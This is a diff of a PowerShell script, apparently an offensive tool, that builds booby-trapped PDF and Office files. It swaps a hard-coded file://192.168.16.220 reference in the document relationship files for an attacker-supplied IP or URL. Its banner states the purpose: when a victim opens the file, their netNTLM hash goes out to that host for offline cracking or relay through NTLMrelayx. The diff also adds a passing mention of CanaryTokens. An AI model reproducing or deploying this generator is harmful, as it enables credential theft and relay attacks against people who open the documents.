@@ -28,8 +28,7 @@ Function zip($action,$source,$destination) {
 
 Function write_file ($content,$outfile) {
 
-  $ip = Read-Host -Prompt "Enter target IP"
-
+  
   
   If (!(test-path $destination)) {
         mkdir $destination
@@ -37,27 +36,28 @@ Function write_file ($content,$outfile) {
     
  
   if ($outfile.contains(".pdf")) {
-      
-      [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($content)) | Out-File $destination"/"$outfile
+      $ip = Read-Host -Prompt "`nEnter target IP"
+            [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($content)) | Out-File $destination"/"$outfile
       ((Get-Content -path $destination"/"$outfile -Raw) -replace 'target',"$ip") | Set-Content -Path $pwd/$outfile
 
   } 
   else {
+      $ip = Read-Host -Prompt "`nEnter protocol and target ip or hostname. e.g. file://ip, http://host.somewhere.com/file.html`n`nTarget"
       $bytes = [Convert]::FromBase64String($content)
       [IO.File]::WriteAllBytes($destination+"/"+$outfile, $bytes) 
       zip "unzip" $destination"/"$outfile  $destination"/wd/" 
      
         if ($outfile.contains(".docx")) {
         
-            ((Get-Content -path $destination/wd/word/_rels/header1.xml.rels -Raw) -replace 'file://192.168.16.220',"file://$ip") | Set-Content -Path $destination/wd/word/_rels/header1.xml.rels
+            ((Get-Content -path $destination/wd/word/_rels/header1.xml.rels -Raw) -replace 'file://192.168.16.220',"$ip") | Set-Content -Path $destination/wd/word/_rels/header1.xml.rels
       
         } elseif ($outfile.contains(".xlsx")) {
         
-            ((Get-Content -path $destination/wd/xl/drawings/_rels/drawing1.xml.rels -Raw) -replace 'file://192.168.16.220',"file://$ip") | Set-Content -Path $destination/wd/xl/drawings/_rels/drawing1.xml.rels
+            ((Get-Content -path $destination/wd/xl/drawings/_rels/drawing1.xml.rels -Raw) -replace 'file://192.168.16.220',"$ip") | Set-Content -Path $destination/wd/xl/drawings/_rels/drawing1.xml.rels
       
         } elseif ($outfile.contains(".pptx")) {
         
-            ((Get-Content -path $destination/wd/ppt/slides/_rels/slide1.xml.rels -Raw) -replace 'file://192.168.16.220',"file://$ip") | Set-Content -Path $destination/wd/ppt/slides/_rels/slide1.xml.rels
+            ((Get-Content -path $destination/wd/ppt/slides/_rels/slide1.xml.rels -Raw) -replace 'file://192.168.16.220',"$ip") | Set-Content -Path $destination/wd/ppt/slides/_rels/slide1.xml.rels
       
       }
 
@@ -83,7 +83,7 @@ $logo = 'IF9fX19fICBfX18gIF9fX19fX19fX19fICBfX18gICAgICAgX19fICAgICAgX19fICBfX19
 $logo = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($logo))
 write-host $logo -ForegroundColor yellow
 Write-Host "                                                                                        by 4ndr34z" -ForegroundColor yellow
-write-host "`nAbout:`nExfiltrates users netNTLM hash to target IP when opening the document,`neffectively stealing the hash for offline cracking.`n`nOr, the target IP could be a listening NTLMrelayx, relaying it to other resources.`n"
+write-host "`nAbout:`nExfiltrates users netNTLM hash to target IP when opening the document,`neffectively stealing the hash for offline cracking.`n`nOr, the target IP could be a listening NTLMrelayx, relaying it to other resources.`n`nYou can also place CanaryTokens in Word, Excel and PowerPoint`n`n"
 
 $MainMenu = {
 
